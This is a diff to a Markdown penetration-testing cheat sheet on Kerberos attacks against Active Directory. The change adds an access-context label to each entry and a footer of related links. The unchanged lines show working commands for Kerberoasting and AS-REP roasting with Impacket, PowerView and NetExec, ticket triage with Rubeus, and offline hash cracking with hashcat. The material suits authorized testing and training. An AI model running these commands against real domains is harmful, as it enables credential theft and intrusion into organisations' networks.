@@ -37,7 +37,7 @@ GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile 
 Get-DomainUser -PreauthNotRequired | Select samaccountname
 ```
 
-**Tool:** PowerView · **Platform:** Windows
+**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user
 
 
 ## NetExec AS-REP roasting
@@ -46,7 +46,7 @@ Get-DomainUser -PreauthNotRequired | Select samaccountname
 nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --asreproast asrep.txt
 ```
 
-**Tool:** NetExec · **Platform:** Linux/macOS
+**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user
 
 
 ## Impacket AS-REP roasting
@@ -55,7 +55,7 @@ nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --asreproast asrep.txt
 GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat -outputfile asrep.txt
 ```
 
-**Tool:** Impacket · **Platform:** Linux/macOS
+**Tool:** Impacket · **Platform:** Linux/macOS · **Context:** No auth
 
 
 ## List Windows Kerberos tickets
@@ -64,7 +64,7 @@ GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -format h
 klist
 ```
 
-**Tool:** klist · **Platform:** Windows
+**Tool:** klist · **Platform:** Windows · **Context:** Domain user
 
 
 ## Rubeus ticket triage
@@ -73,7 +73,7 @@ klist
 Rubeus.exe triage
 ```
 
-**Tool:** Rubeus · **Platform:** Windows
+**Tool:** Rubeus · **Platform:** Windows · **Context:** Domain user
 
 
 ## Hashcat Kerberoast etype 23
@@ -82,7 +82,7 @@ Rubeus.exe triage
 hashcat -m 13100 kerberoast.txt <WORDLIST>
 ```
 
-**Tool:** hashcat · **Platform:** Cross-platform
+**Tool:** hashcat · **Platform:** Cross-platform · **Context:** Domain user
 
 
 ## Hashcat AS-REP etype 23
@@ -91,4 +91,8 @@ hashcat -m 13100 kerberoast.txt <WORDLIST>
 hashcat -m 18200 asrep.txt <WORDLIST>
 ```
 
-**Tool:** hashcat · **Platform:** Cross-platform
+**Tool:** hashcat · **Platform:** Cross-platform · **Context:** Domain user
+
+---
+
+**Related:** [Overview](./) · [Gpo](gpo.md) · [Laps Gmsa](laps-gmsa.md)
